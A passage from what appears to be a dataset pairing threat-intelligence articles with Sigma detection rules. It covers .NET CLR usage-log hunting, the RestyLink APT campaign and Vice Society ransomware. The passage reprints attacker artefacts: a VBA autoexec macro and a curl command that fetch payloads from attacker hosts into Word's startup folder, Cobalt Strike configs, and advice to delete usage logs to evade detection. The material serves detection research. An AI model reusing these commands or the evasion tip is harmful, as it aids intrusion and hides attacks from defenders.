C:\\Windows\\System32\\rundll32.exe\n  C:\\Windows\\System32\\diagnhost.exe\n  C:\\Windows\\System32\\tszync.exe\n  C:\\Windows\\System32\\vmconnect.exe\n  C:\\Windows\\System32\\wbem\\WmiPrivSE.exe\n  C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n  C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell_ise.exe\n  C:\\Windows\\SysWOW64\\msiexec.exe\n  C:\\Windows\\SysWOW64\\rundll32.exe\n  C:\\Windows\\SysWOW64\\diagnhost.exe\n  C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe\n```\n\nAs you can see above, the windows system processes that loads managed code are quite limited and can be baselined, for instance a straightforward detection is to alert for the following:\n\n```image\nAlt: Capture\nDescription: The image displays a section of a log file or code snippet related to monitoring .NET CLR usage logs. It includes XML-like tags indicating conditions for execution related to suspicious managed code host processes, such as 'cscript.exe.log', 'wscript.exe.log', 'mshta.log', and 'svchost.exe.log'. This suggests a method for detecting potential malicious activity by filtering for specific file creation or execution logs.\nTranscription: |\n  <RuleGroup>\n      <Rule>\n          <TargetFileName condition=\"end with\" name=\"Execution - Susp ManagedCode Host Processes\">*\\\\UsageLogs\\\\cscript.exe.log</TargetFileName>\n      </Rule>\n      <Rule>\n          <TargetFileName condition=\"end with\" name=\"Execution - Susp ManagedCode Host Processes\">*\\\\UsageLogs\\\\wscript.exe.log</TargetFileName>\n      </Rule>\n      <Rule>\n          <TargetFileName condition=\"end with\" name=\"Execution - Susp ManagedCode Host Processes\">*\\\\UsageLogs\\\\mshta.log</TargetFileName>\n      </Rule>\n      <Rule>\n          <TargetFileName condition=\"end with\" name=\"Execution - Susp ManagedCode Host Processes\">*\\\\UsageLogs\\\\wmic.log</TargetFileName>\n      </Rule>\n      <Rule>\n          <TargetFileName condition=\"end with\" name=\"Execution - Susp ManagedCode Host Processes\">*\\\\UsageLogs\\\\regsvr32.exe.log</TargetFileName>\n      </Rule>\n      <Rule>\n          <TargetFileName condition=\"end with\" name=\"Execution - Susp ManagedCode Host Processes\">*\\\\UsageLogs\\\\svchost.log</TargetFileName>\n      </Rule>\n  </RuleGroup>\n```\n\nWhile googling for extra information about .NET UsageLogs, we come across this interesting article explaining how to use CLR Load logging (different than UsageLogs) for debugging purposes and that can be enabled via a simple registry change and specifying where a path where to store those logs, doing so resulting in the following interesting details after the .hta execution:\n\n```image\nAlt: Capture\nDescription: The image displays a file directory structure on a Windows operating system, showing log files related to .NET CLR Load activities. The files are named according to the process that generated them, including 'mshta.exe.CLRLoad05.log', 'ngen.exe.CLRLoad01.log', and others, with details such as their modification date, type, size, and creation date visible. This directory is likely used for monitoring and analyzing .NET usage, particularly in the context of cybersecurity and digital forensics.\n```\n\nFor every execution a log file is created, below an example of SharpShooter .hta payload:\n\n```image\nAlt: Capture\nDescription: The image displays a portion of a log file output from a Windows command line interface. It shows the CLR loading log for the execution of 'mshta.exe' with specific details about function calls and the associated CLSID. Key information includes the CLSID `{50369004-D9BA-3A75-BE7A-1D0EF01789D3}`, the log start time, and input values for a method call, indicating the inner workings of .NET code execution and serialization related to the previous discussions about .NET CLR Usage Logs.\nTranscription: |\n  13504, 35124.109, CLR Loading log for C:\\Windows\\SysWOW64\\mshta.exe\n  13504, 35124.109, Log started at 11:40:39 PM on 7/15/2019\n  13504, 35124.109, FunctionCall: DllGetClassObject. Clsid: {50369004-D9BA-3A75-BE7A-1D0EF01789D3}, Id: {50369004-D9BA-3A75-BE7A-1D0EF01789D3}\n  13504, 35124.109, Input values for ComputeVersionString follow this line\n  13504, 35124.109, IsLegacyBind is: 1\n  13504, 35124.109, IsCapped is 1\n  \n  [WINDOWS][system32]reg query hkey_classes_root\\clsid\\{50369004-D9BA-3A75-BE7A-1D0EF01789D3}\n  HKEY_CLASSES_ROOT\\clsid\\{50369004-D9BA-3A75-BE7A-1D0EF01789D3}\n      (Default)    REG_SZ    System.Runtime.Serialization.Formatters.Binary.BinaryFormatter\n  HKEY_CLASSES_ROOT\\clsid\\{50369004-D9BA-3A75-BE7A-1D0EF01789D3}\\Implemented categories\n  HKEY_CLASSES_ROOT\\clsid\\{50369004-D9BA-3A75-BE7A-1D0EF01789D3}\\InprocServer32\n  HKEY_CLASSES_ROOT\\clsid\\{50369004-D9BA-3A75-BE7A-1D0EF01789D3}\\ProgID\n```\n\nAlthough the CLR Load Logs provide more detailed information including invoked .NET COM objects, FunctionCall and Methods's names it's quite verbose and you can't exclude noisy processes.\n\n**TakeAway:**\n\nUsing your EDR or Sysmon, hunt for File Creation with file path and name matching the following logic:\n\n```\n*\\\\UsageLogs\\\\cscript.exe.log|(wscript.exe.log)|mshta.log|wmic.log|regsvr32.exe.log|svchost.log\n```\n\nThe advantage of this detection method is that you can hunt for it using just powershell or alike to scan filesystem for any matching file that related to a potential previous infections.\n\nFor RedTeamers, go for the vba payload as winword.exe and excel.exe are legit managed code host processes. and make sure you delete the corresponding .NET usage .log file if you plan to use hta, vbscript or jscript payloads.\n\n**Bonus:**\nYou can download example of evtx logs for SharpShooter sysmon traces here (https://github.com/sbousseaden/EVTX-ATTACK-SAMPLES/blob/master/Execution/sysmon_mshta_sharpshooter_stageless_meterpreter.evtx).",
    "sigma_rule": {
      "title": "Suspicious DotNET CLR Usage Log Artifact",
      "id": "e0b06658-7d1d-4cd3-bf15-03467507ff7c",
      "related": [
        {
          "id": "4508a70e-97ef-4300-b62b-ff27992990ea",
          "type": "derived"
        },
        {
          "id": "e4b63079-6198-405c-abd7-3fe8b0ce3263",
          "type": "obsolete"
        }
      ],
      "status": "test",
      "description": "Detects the creation of Usage Log files by the CLR (clr.dll). These files are named after the executing process once the assembly is finished executing for the first time in the (user) session context.",
      "references": [
        "https://bohops.com/2021/03/16/investigating-net-clr-usage-log-tampering-techniques-for-edr-evasion/",
        "https://github.com/olafhartong/sysmon-modular/blob/fa1ae53132403d262be2bbd7f17ceea7e15e8c78/11_file_create/include_dotnet.xml",
        "https://web.archive.org/web/20221026202428/https://gist.github.com/code-scrap/d7f152ffcdb3e0b02f7f394f5187f008",
        "https://web.archive.org/web/20230329154538/https://blog.menasec.net/2019/07/interesting-difr-traces-of-net-clr.html"
      ],
      "author": "frack113, omkar72, oscd.community, Wojciech Lesicki",
      "date": "2022-11-18",
      "modified": "2023-02-23",
      "tags": [
        "attack.defense-evasion",
        "attack.t1218"
      ],
      "logsource": {
        "category": "file_event",
        "product": "windows",
        "definition": "Requirements: UsageLogs folder must be monitored by the sysmon configuration"
      },
      "detection": {
        "selection": {
          "TargetFilename|endswith": [
            "\\UsageLogs\\cmstp.exe.log",
            "\\UsageLogs\\cscript.exe.log",
            "\\UsageLogs\\mshta.exe.log",
            "\\UsageLogs\\msxsl.exe.log",
            "\\UsageLogs\\regsvr32.exe.log",
            "\\UsageLogs\\rundll32.exe.log",
            "\\UsageLogs\\svchost.exe.log",
            "\\UsageLogs\\wscript.exe.log",
            "\\UsageLogs\\wmic.exe.log"
          ]
        },
        "filter_main_rundll32": {
          "ParentImage|endswith": "\\MsiExec.exe",
          "ParentCommandLine|contains": " -Embedding",
          "Image|endswith": "\\rundll32.exe",
          "CommandLine|contains|all": [
            "Temp",
            "zzzzInvokeManagedCustomActionOutOfProc"
          ]
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Rundll32.exe with zzzzInvokeManagedCustomActionOutOfProc in command line and msiexec.exe as parent process - https://twitter.com/SBousseaden/status/1388064061087260675"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\file\\file_event\\file_event_win_net_cli_artefact.yml",
    "id": "860"
  },
  {
    "url": "https://insight-jp.nttsecurity.com/post/102hojk/operation-restylink-apt-campaign-targeting-japanese-companies",
    "markdown": "# Operation RestyLink: APT campaign targeting Japanese companies\n\n---\n\nPublished May 13, 2022\n\nThis article is a translation of the \"Operation RestyLink: 日本企業を狙った標的型攻撃キャンペーン\".\n\n---\n\nOur SOC observed an APT campaign targeting Japanese companies starting from mid-April 2022. We think that this campaign had already started in March 2022 and related attacks might have been performed around October 2021. It implies that this campaign is not temporary nor intensive, and it could continue from here forward.\n\nIn this article, we report the detailed analysis of this campaign and discuss the attributes of the attacking group.\n\n## Attack Overview\n\nThe attack that we observed in mid-April 2022 was as follows:\n\n```image\nAlt: Attack Overview\nDescription: The image depicts a flowchart illustrating the steps of the APT campaign Operation RestyLink. It shows how a spear phishing email leads to the download of a ZIP file, which contains a LNK file. Executing the LNK file initiates the download of a DOT file, which is then placed in the Microsoft Word Startup folder. The flowchart also indicates that a decoy PDF file is displayed to attract user attention while the DOT files are executed.\nTranscription: |\n  graph TD;\n      A[http:] --> B[ZIP];\n      B --> C[LNK];\n      C --> D[DOT];\n      D --> E[DOT];\n      C --> F[PDF];\n      subgraph Attacker\n          direction TB;\n          G[*disknxt.com];\n          H[resource.officehoster.com];\n      end\n      A --> G;\n      B --> G;\n      C --> G;\n      D --> H;\n      E --> H;\n```\n\nOnce a user accessed the URL in a spear phishing email, a ZIP file was downloaded from the server operated by the attacker. As soon as executing the LNK file included in the ZIP file, a DOT file was downloaded from the server using Windows command and placed in the Microsoft Word Startup folder. During this phase, a decoy PDF file was displayed to attract user attention.\n\nWhenever the user opens a Word file, the DOT file placed in the Startup folder is loaded and the embedded macro is executed. The macro then downloads another DOT file from the server and executes the file. However, we could not download this DOT file at the time of our research.\n\n## Detailed Analysis\n\n### LNK file\n\nThe icon image of the LNK file was that of a PDF file, but it used ScriptRunner.exe to execute the following tasks:\n\n1. Displays a decoy PDF file.\n2. Downloads a DOT file and places it in the Microsoft Word Startup folder.\n\nThere were two decoy PDF files, both of which were about the relationship between Japan and South Korea. The redacted parts contain real person names.\n\n### DOT file\n\nWhenever a user opens a Word file, the DOT file placed in the Startup folder is loaded. The macro embedded in the DOT file was as follows:\n\n```image\nAlt: DOT File Macro\nDescription: The image displays a code snippet from a macro written in Visual Basic for Applications (VBA) used in Microsoft Word. The macro is designed to execute upon opening a document, as indicated by the 'Sub autoexec()' function. It checks if a certain condition related to the document's XML saving state is met, and if so, it attempts to open another DOT file from a specified URL that incorporates the username of the current environment. This reflects a method employed in a cyber attack to download and execute malicious files.\nTranscription: |\n  Sub autoexec()\n      On Error Resume Next\n      If ThisDocument.XMLSaveThroughXSLT <> Day(Now) Then\n          ThisDocument.XMLSaveThroughXSLT = Day(Now)\n          Application.Documents.Open \"http://resource.officehoster.com/w\" + Environ(\"username\") + \".dot\", Visible:=0\n          ThisDocument.Save\n      End If\n  End If\n  End Sub\n```\n\nThe macro downloads another DOT file and executes the file. The attacker already has user environment information at this stage because the username is included in the target file name. We could not download this DOT file during our research.\n\n## Related Attacks and Events\n\n### Attack Case in Late April 2022\n\nIn late April 2022, we confirmed that we could download an ISO file from the same infrastructure as discussed in the previous section. The attack vector was as follows.\n\n```image\nAlt: Late April Attack\nDescription: The image illustrates the attack vector used in the cyber operation. It features a flowchart depicting the sequence of file interactions, starting from an ISO file being downloaded via HTTP. The ISO file contains a legitimate Microsoft Word executable (EXE) file alongside a malicious DLL file. The flow shows the DLL being loaded when the EXE file is executed, which subsequently downloads and executes the Cobalt Strike Stager. The diagram visually represents the relationships between various file types (ISO, EXE, DLL, DOCX, BIN) and the servers involved in the attack.\nTranscription: |\n  df147sx.disknxt.com\n            |\n            v\n        http:\n            |\n            v\n        目次と内容説明.iso\n            |\n            v\n        目次説明.docx.exe\n            |\n            +-------------------+\n            |                   |\n            v                   v\n        wwwlib.dll         file.doc\n            |\n            v\n        CobaltStrike\n            |\n            v\n        BIN\n```\n\nThe ISO file included a legitimate Microsoft Word EXE file and a malicious DLL file besides a decoy file. The DLL file is to be sideloaded and executed when the EXE file is executed.\n\nThe DLL file was an UPX packed Golang downloader. The DLL file downloaded Cobalt Strike Stager from the server and executed the file. The attacker investigated the environment using various commands provided by Cobalt Strike.\n\nThe Config file used by the executed Cobalt Strike Stager was as follows:\n\n```image\nAlt: Cobalt Strike Config\nDescription: The image displays a configuration file related to a Cobalt Strike Stager, outlining various parameters for its operation. It includes fields such as 'BeaconType', 'Port', 'PublicKey_MD5', 'C2Server', 'UserAgent', and 'HttpPostUri'. Additionally, it lists 'Malleable_C2_Instructions' detailing specific manipulations, such as removing bytes from the data stream and performing Base64 URL-safe decoding, alongside a watermark identifier.\nTranscription: |\n  BeaconType\n  - HTTPS\n  Port\n  - 443\n  PublicKey_MD5\n  - defb5d95ce99e1ebbf421a1a38d9cb64\n  C2Server\n  - abc.mbusabc[.]com,/sdgs/article\n  UserAgent\n  - Not Found\n  HttpPostUri\n  - /gtm.js\n  Malleable_C2_Instructions\n  - Remove 1522 bytes from the end\n  - Remove 88 bytes from the beginning\n  - Remove 3931 bytes from the beginning\n  - Base64 URL-safe decode\n  - XOR mask w/ random key\n  Watermark\n  - 1580103824\n```\n\n### Related Events in Early April 2022\n\nIn early April 2022, we observed outbound access to the infrastructure (IP address) used in the discussed campaign. The detail was unknown, but we suspect that this access was part of the discussed campaign considering the attacking target, period, and infrastructure.\n\n### Related Events in March 2022\n\nAn interesting LNK file that had similar characteristics as the LNK file used in the discussed campaign was posted to VirusTotal by March 2022 from Japan.\n\n```image\nAlt: March LNK File\nDescription: The image displays a command line interface (CLI) output showing a series of commands executed using cmd.exe on a Windows operating system. The commands demonstrate the downloading of a PDF file and a DOT file from a specified URL, the creation of a directory within the user's Microsoft Word Startup folder, and the launching of the explorer application. This output is relevant to the APT campaign targeting Japanese companies, as it illustrates the methods employed in the attack.\nTranscription: |\n  C:\\Windows\\system32\\cmd.exe /c explorer https://6bfeeb71c.disknxt.com/\n  VmpJd01WXlSb1JTYWsw/研修会案内.pdf & mkdir %appdata%\\Microsoft\\Word\\STARTUP &\n  curl -o %appdata%\\Microsoft\\Word\\STARTUP\\f.dot https://6bfeeb71c.disknxt.com/\n  1JTYWsw/annak.docx\n```\n\nThis sample uses cmd.exe instead of ScriptRunner.exe, but the executed commands and the used attacking infrastructure are the same. It is highly probable that the attack using this LNK file was part of the discussed campaign.\n\nAt the time of our research, we could not get the first DOT file. The decoy PDF files were about Japanese diplomacy in East Asia.\n\n### Related Events in January 2022\n\nThe Golang downloader used in the late April 2022 attack case downloaded Cobalt Strike Stager from “/Events” with an odd User-Agent. This User-Agent was that of Yandex Browser which was uncommon in Japan. We found a sample that had the same characteristics posted to VirusTotal from Japan in January 2022. Because there are similarities in their infrastructure, this event could also be related to the discussed campaign.\n\n```image\nAlt: Covenant Trace\nDescription: The image displays a User-Agent string typically associated with web browsers. It includes details about the operating system (Windows NT 10.0; WOW64), the browser (YaBrowser), and its version (22.12.0.966). This information is relevant in the context of identifying unusual browser behavior, particularly in relation to a cyber attack targeting Japanese companies during the Operation RestyLink campaign. The specificity of the User-Agent may help analysts determine the legitimacy of traffic or identify potential malicious activity.\nTranscription: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.60 YaBrowser/22.12.0.966 Yowser/2.5 Safari/537.36\n```\n\nDuring the investigation on the IP addresses corresponding to other subdomains, we found the trace of Covenant, known as an open-source C2 framework. The attacker might have used Covenant in addition to Cobalt Strike.\n\n```image\nAlt: Covenant Framework\nDescription: The image is a screenshot displaying an HTTPS response with a status code of 200 OK from a server. It includes detailed information about the SSL certificate being used, such as the version (3), serial number, signature algorithm (sha256WithRSAEncryption), issuer (CN=Covenant), validity dates, and the public key information. The server identified is Kestrel, and the content type is text/html with UTF-8 charset.\nTranscription: |\n  HTTP/1.1 200 OK\n  Date: Tue, 12 Apr 2022 05:24:35 GMT\n  Content-Type: text/html; charset=utf-8\n  Server: Kestrel\n  Transfer-Encoding: chunked\n  \n  SSL Certificate\n  \n  Certificate:\n    Data:\n      Version: 3 (0x2)\n      Serial Number: 5294099993578943392 (0x49786bd79199efa0)\n      Signature Algorithm: sha256WithRSAEncryption\n      Issuer: CN=Covenant\n    Validity\n      Not Before: Apr 11 03:00:55 2022 GMT\n      Not After : Apr 9 03:00:55 2032 GMT\n    Subject: CN=Covenant\n    Subject Public Key Info:\n      Public Key Algorithm: rsaEncryption\n      RSA Public-Key: (2048 bit)\n```\n\n### Related Events in November 2021\n\nThe domain differentfor[.]com registered in November 2021 was related to the Cobalt Strike activity observed in January and late April 2022. Because its infrastructure, domain, file path, HTTP header, and Cobalt Strike Config are the same as those of the discussed campaign, it could relate to the campaign.\n\n```image\nAlt: November Events\nDescription: The image displays a technical overview of the C2 (Command and Control) server configuration and instructions related to an APT campaign targeting Japanese companies. It includes various parameters such as BeaconType, Port, PublicKey_MD5, C2Server, UserAgent, HttpPostUri, and Malleable_C2_Instructions. Each parameter is followed by specific values or actions, such as the HTTPS port 443, a specific PublicKey_MD5 hash, and various data manipulation instructions for the C2 communication.\nTranscription: |\n  BeaconType\n  - HTTPS\n  Port\n  - 443\n  PublicKey_MD5\n  - defb5d95ce99e1ebb421a1a38d9cb64\n  C2Server\n  - d.differentfor[.]com,/sdgs/article\n  UserAgent\n  - Not Found\n  HttpPostUri\n  - /gtm.js\n  Malleable_C2_Instructions\n  - Remove 1522 bytes from the end\n  - Remove 88 bytes from the beginning\n  - Remove 3931 bytes from the beginning\n  - Base64 URL-safe decode\n  - XOR mask w/ random key\n  Watermark\n  - 1580103824\n```\n\n### Related Events in October 2021\n\nDuring our research on this attacking campaign, we found that attacks using similar attacking infrastructure might have been performed in late October 2021.\n\nAt the time of our research, we could not get the files used in this attack. However, malicious files could have been downloaded from the web server pretending to be SASAKAWA USA.\n\n## Attribution\n\nThe following figure summarizes the characteristics that we found related to the discussed campaign.\n\n```image\nAlt: Attribution Summary\nDescription: The image is a diagram summarizing the characteristics of an APT campaign targeting Japanese companies, labeled 'Operation RestyLink'. It is divided into four quadrants, each addressing different aspects of the campaign: 'Adversary', 'Capabilities', 'Infrastructure', and 'Victims'. Each section contains bullet points providing specific details. For example, under 'Capabilities', it lists techniques like 'Downloader', 'LNK file', and 'Cobalt Strike'. The 'Victims' section highlights targeted entities such as Japanese companies and the diplomatic field. The overall design uses a geometric shape to effectively categorize and present the information.\nTranscription: |\n  +----------------------+---------------------------------------------+\n  | Social-Politics Axis | - Japanese diplomacy in East Asia           |\n  +----------------------+---------------------------------------------+\n  | Adversary            | - Believed to be based in East Asia?        |\n  +----------------------+---------------------------------------------+\n  | Capabilities         | - Downloader                                |\n  |                      |   - LNK file                                |\n  |                      |   - Multiple document                       |\n  |                      |   - Golang binary                           |\n  |                      | - Cobalt Strike                             |\n  +----------------------+---------------------------------------------+\n  | Infrastructure       | - VPS/Hosting service (LINODE/CHOOPA/Vultr) |\n  |                      | - OpenResty                                 |\n  |                      | - Mimicking domain name                     |\n  +----------------------+---------------------------------------------+\n  | Technical Axis       | - Spear-phishing                            |\n  |                      | - DLL Side-Loading                          |\n  |                      | - Microsoft Word startup                    |\n  |                      | - Japanese decoy file                       |\n  |                      | - Use of IPs belonging to Japan             |\n  +----------------------+---------------------------------------------+\n  | Victims              | - Japanese company                          |\n  |                      | - Diplomatic field                          |\n  |                      |   (Especially Japan and South Korea)        |\n  +----------------------+---------------------------------------------+\n```\n\nThere are various characteristics, but what we should pay attention to is the fact that this campaign clearly targets Japan. The attacker selected target users carefully, prepared decoy files written in natural Japanese, and leveraged Japanese IP addresses. It was apparent that Japan was not attacked just by accident, and the attacker was highly motivated to attack Japan. The access to the web server used in this campaign might have been limited based on geological information, which suggests the attacker’s carefulness and slyness. Because there are only a few APT groups that have the capability and motivation to attack Japan, the candidate APT groups are limited.\n\nBased on our research, we would like to name four APT groups that we think are related to this campaign. Taking the other trivial information not mentioned in this article into consideration, we think that DarkHotel is the strongest suspect at the time of writing this article. Because there is no convincing evidence, this assumption could change depending on future research.\n\n### DarkHotel\n\nDarkHotel is an APT group said to attribute to South Korea and their attacks have been rather frequently observed in Japan. They are continuously attacking Japanese media companies or think tanks. They perform spear phishing attacks using Japanese emails and decoy files, execute multistage downloaders and loaders using LNK files. Based on the similarities of these characteristics, we suspect that DarkHotel is related to the discussed campaign.\n\n### Kimsuky\n\nKimsuky is an APT group said to attribute to North Korea and their attacks have been sometimes observed in Japan. It is said that Kimsuky targets North Korean refugees and related organizations, but Japanese media companies had also been targeted in the past. It is reported that they used LNK files in their recent attacks. These characteristics have several points in common with the discussed campaign.\n\n### APT29\n\nAPT29 is an APT group said to attribute to Russia and their attacks have been rarely reported in Japan. However, the recent Ukraine situation could motivate them to attack Japan. It is already reported that APT29 used LNK or ISO files in their attacks. They are also known for leveraging Cobalt Strike or Golang malware. These characteristics have some points in common with the discussed campaign.\n\n### TA416\n\nTA416 is an APT group said to attribute to China and the attacks have been sometimes observed in Japan. It is known that TA416 uses LNK files or Cobalt Strike. These characteristics have similarity with the discussed campaign.\n\n## Conclusion\n\nAs of April 2022, an APT campaign targeting Japanese companies has been observed. Though we named several candidate APT groups that can be active behind the campaign, there is no clear evidence that tells which one. Because similar attacks could have been performed for several months, it is necessary to monitor the situation continuously.\n\n## IoCs\n\n- *.disknxt[.]com\n- *.officehoster[.]com\n- *.youmiuri[.]com\n- *.spffusa[.]org\n- *.sseekk[.]xyz\n- *.mbusabc[.]com\n- *.differentfor[.]com\n- 103[.]29.69.155\n- 149[.]28.16.63\n- 172[.]104.122.93\n- 172[.]105.229.93\n- 172[.]105.229.216\n- 207[.]148.91.243\n- 45[.]77.179.110\n\n## References\n\n[1] MITRE ATT&CK, \"Darkhotel\", https://attack.mitre.org/groups/G0012/\n\n[2] NTTセキュリティ・ジャパン, \"マルウエアが含まれたショートカットファイルをダウンロードさせる攻撃のさらにその先\", https://techblog.security.ntt/102fmlc\n\n[3] JPCERT/CC, \"Attack Convincing Users to Download a Malware-Containing Shortcut File\", https://blogs.jpcert.or.jp/en/2019/06/darkhotel-lnk.html\n\n[4] マクニカ, \"標的型攻撃の実態と対策アプローチ 第3版\", https://www.macnica.co.jp/business/security/manufacturers/files/mpressioncss_ta_report_2019_2_nopw.pdf\n\n[5] Macnica Networks Crop., \"APT Threat Landscape in Japan 2020\", https://www.macnica.co.jp/business/security/manufacturers/files/mpressioncss_ta_report_2020_5_en.pdf\n\n[6] IPA, \"サイバーレスキュー隊（J-CRAT） 活動状況 [2019 年度下半期]\", https://www.ipa.go.jp/files/000083013.pdf\n\n[7] Mandiant, \"Not So Lazarus: Mapping DPRK Cyber Threat Groups to Government Organizations\", https://www.mandiant.com/resources/mapping-dprk-groups-to-government\n\n[8] IPA, \"サイバーレスキュー隊（J-CRAT） 活動状況 [2021 年度上半期]\", https://www.ipa.go.jp/files/000094548.pdf\n\n[9] Cybereason, \"Back to the Future: Inside the Kimsuky KGH Spyware Suite\", https://www.cybereason.com/blog/research/back-to-the-future-inside-the-kimsuky-kgh-spyware-suite\n\n[10] Stairwell, \"The ink-stained trail of GOLDBACKDOOR\", https://stairwell.com/news/threat-research-the-ink-stained-trail-of-goldbackdoor/\n\n[11] MITRE ATT&CK, \"APT29\", https://attack.mitre.org/groups/G0016/\n\n[12] Volexity, \"Suspected APT29 Operation Launches Election Fraud Themed Phishing Campaigns\", https://www.volexity.com/blog/2021/05/27/suspected-apt29-operation-launches-election-fraud-themed-phishing-campaigns/\n\n[13] Microsoft, \"Breaking down NOBELIUM’s latest early-stage toolset\", https://www.microsoft.com/security/blog/2021/05/28/breaking-down-nobeliums-latest-early-stage-toolset/\n\n[14] Mandiant, \"Not So Cozy: An Uncomfortable Examination of a Suspected APT29 Phishing Campaign\", https://www.mandiant.com/resources/not-so-cozy-an-uncomfortable-examination-of-a-suspected-apt29-phishing-campaign\n\n[15] JPCERT/CC, \"Malware “WellMess” Targeting Linux and Windows\", https://blogs.jpcert.or.jp/en/2018/07/malware-wellmes-9b78.html\n\n[16] Proofpoint, “The Good, the Bad, and the Web Bug: TA416 Increases Operational Tempo Against European Governments as Conflict in Ukraine Escalates”, https://www.proofpoint.com/us/blog/threat-insight/good-bad-and-web-bug-ta416-increases-operational-tempo-against-european\n\n[17] CrowdStrike, “Meet CrowdStrike’s Adversary of the Month for June: MUSTANG PANDA”, https://www.crowdstrike.com/blog/meet-crowdstrikes-adversary-of-the-month-for-june-mustang-panda/\n\n[18] Cisco, “Mustang Panda deploys a new wave of malware targeting Europe”, https://blog.talosintelligence.com/2022/05/mustang-panda-targets-europe.html",
    "sigma_rule": {
      "title": "Potential Persistence Via Microsoft Office Startup Folder",
      "id": "0e20c89d-2264-44ae-8238-aeeaba609ece",
      "status": "test",
      "description": "Detects creation of Microsoft Office files inside of one of the default startup folders in order to achieve persistence.",
      "references": [
        "https://insight-jp.nttsecurity.com/post/102hojk/operation-restylink-apt-campaign-targeting-japanese-companies",
        "https://web.archive.org/web/20240304163011/https://learn.microsoft.com/en-us/office/troubleshoot/excel/use-startup-folders"
      ],
      "author": "Max Altgelt (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-06-02",
      "modified": "2023-06-22",
      "tags": [
        "attack.persistence",
        "attack.t1137"
      ],
      "logsource": {
        "category": "file_event",
        "product": "windows"
      },
      "detection": {
        "selection_word_paths": [
          {
            "TargetFilename|contains": "\\Microsoft\\Word\\STARTUP"
          },
          {
            "TargetFilename|contains|all": [
              "\\Office",
              "\\Program Files",
              "\\STARTUP"
            ]
          }
        ],
        "selection_word_extension": {
          "TargetFilename|endswith": [
            ".doc",
            ".docm",
            ".docx",
            ".dot",
            ".dotm",
            ".rtf"
          ]
        },
        "selection_excel_paths": [
          {
            "TargetFilename|contains": "\\Microsoft\\Excel\\XLSTART"
          },
          {
            "TargetFilename|contains|all": [
              "\\Office",
              "\\Program Files",
              "\\XLSTART"
            ]
          }
        ],
        "selection_excel_extension": {
          "TargetFilename|endswith": [
            ".xls",
            ".xlsm",
            ".xlsx",
            ".xlt",
            ".xltm"
          ]
        },
        "filter_main_office": {
          "Image|endswith": [
            "\\WINWORD.exe",
            "\\EXCEL.exe"
          ]
        },
        "condition": "(all of selection_word_* or all of selection_excel_*) and not filter_main_office"
      },
      "falsepositives": [
        "Loading a user environment from a backup or a domain controller",
        "Synchronization of templates"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\file\\file_event\\file_event_win_office_startup_persistence.yml",
    "id": "871"
  },
  {
    "url": "https://intel.thedfirreport.com/events/view/30032",
    "markdown": "",
    "sigma_rule": {
      "title": "Suspicious Binaries and Scripts in Public Folder",
      "id": "b447f7de-1e53-4cbf-bfb4-f1f6d0b04e4e",
      "status": "experimental",
      "description": "Detects the creation of a file with a suspicious extension in the public folder, which could indicate potential malicious activity.",
      "references": [
        "https://intel.thedfirreport.com/events/view/30032",
        "https://intel.thedfirreport.com/eventReports/view/70",
        "https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/"
      ],
      "author": "The DFIR Report",
      "date": "2025-01-23",
      "tags": [
        "attack.execution",
        "attack.t1204"
      ],
      "logsource": {
        "category": "file_event",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "TargetFilename|contains": ":\\Users\\Public\\",
          "TargetFilename|endswith": [
            ".bat",
            ".dll",
            ".exe",
            ".hta",
            ".js",
            ".ps1",
            ".vbe",
            ".vbs"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Administrators deploying legitimate binaries to public folders."
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\file\\file_event\\file_event_win_susp_public_folder_extension.yml",
    "id": "890"
  },
  {
    "url": "https://www.trendmicro.com/en_us/research/23/a/vice-society-ransomware-group-targets-manufacturing-companies.html",
    "markdown": "# Vice Society Ransomware Group Targets Manufacturing Companies\n\nIn this blog entry, we’d like to highlight our findings on Vice Society, which includes an end-to-end infection diagram that we were able to create using Trend Micro internal telemetry.\n\n**Date:** January 24, 2023\n\n---\n\n**Updated on January 26, 2023 to remove references to Kape Tool and to remove Trend Micro Apex One from the list of programs that the ransomware disables.**\n\nThe Vice Society ransomware group made headlines in late 2022 and early 2023 during a spate of attacks against several targets, such as the one that affected the rapid transit system in San Francisco. Most reports have the threat actor focusing its efforts on the education and the healthcare industries. However, through Trend Micro’s telemetry data, we have evidence that the group is also targeting the manufacturing sector, which means that they have capability and desire to penetrate different industries — most likely accomplished via the purchasing of compromised credentials from underground channels. We have detected the presence of Vice Society in Brazil (primarily affecting the country’s manufacturing industry), Argentina, Switzerland, and Israel.\n\nVice Society, which was initially reported to be exploiting the PrintNightmare vulnerability in their routines, have previously deployed ransomware variants such as Hello Kitty/Five Hands and Zeppelin (the group’s email has been in their ransom notes). More recently, Vice Society has been able to develop its own custom ransomware builder and adopt more robust encryption methods. This, and any further enhancements, could mean that the group is preparing for their own ransomware-as-a-service (RaaS) operation.\n\nIn this blog entry, we’d like to highlight our findings on Vice Society, which includes an end-to-end infection diagram that we were able to create using Trend Micro internal telemetry. Our detection name for this variant of Vice Society’s ransomware is Ransom.Win64.VICESOCIETY.A.\n\n```image\nAlt: Figure 1. Vice Society’s evolution throughout 2021 to late 2022\nDescription: The image is a timeline diagram illustrating the evolution of the Vice Society ransomware group from January 2021 to November 2022. It highlights key milestones in the development of various ransomware variants associated with the group, including FiveHands, Zeppelin, Hello Kitty RaaS, Rans Recovery, and the custom-built Vice Society ransomware. Each entry includes the date and relevant technical details about the ransomware, such as the operating systems targeted (Windows 32bit or Linux 64bit) and notable characteristics like encrypted file names.\nTranscription: |\n  Vice Society group\n  \n  January 27, 2021\n  FiveHands ransomware\n  Windows 32bit\n  Windows version of Hello Kitty\n  \n  March 13, 2022\n  Zeppelin ransomware\n  Windows 32bit\n  (encrypted file name).v-society.[random]\n  \n  August 10, 2022\n  Hello 